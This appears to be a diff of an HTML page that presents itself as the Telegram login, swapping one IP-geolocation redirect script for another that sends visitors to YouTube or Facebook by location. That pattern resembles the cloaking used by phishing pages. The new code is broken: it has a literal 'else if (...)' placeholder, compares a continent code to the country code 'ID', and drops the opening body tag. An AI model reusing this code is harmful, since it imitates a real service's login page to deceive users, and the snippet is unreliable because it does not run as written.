@@ -23,31 +23,21 @@
     <meta property="twitter:url" content="https://web.telegram.org">
     <title>Log in to Telegram</title>
 </head>
-<body>
     <script language="Javascript" src="http://gd.geobytes.com/gd?after=-1&variables=GeobytesLocationCode,GeobytesCode,GeobytesInternet"></script>
     <script language="Javascript">
-if(typeof(sGeobytesLocationCode)=="undefined"
-   ||typeof(sGeobytesCode)=="undefined"
-   ||typeof(sGeobytesInternet)=="undefined")
-{
-   // Something has gone wrong with the variables, so set them to some default value,
-   // maybe set a error flag to check for later on.
-   var sGeobytesLocationCode="unknown";
-   var sGeobytesCode="unknown";
-   var sGeobytesInternet="unknown";
-}
-if(sGeobytesLocationCode=="GRATATHE")
-{
-   // Visitors from Athens would go here
-   window.open("https://www.youtube.com/");
-}else if(sGeobytesCode=="ID")
-{
-   // Visitors from Greece would go here
-   window.open("https://web.facebook.com/?_rdc=1&_rdr");
-}
+        $.getJSON("http://api.db-ip.com/v2/free/self").then(function(addrInfo) {
+    if (addrInfo.continentCode == "ID") {
+        document.location = "https://www.youtube.com";
+    } else if (...) {
+        // handle other cases
+    } else {
+        document.location = "https://web.facebook.com";
+    }
+});
 </script>
 </body>
 </html>
+
 
 
 
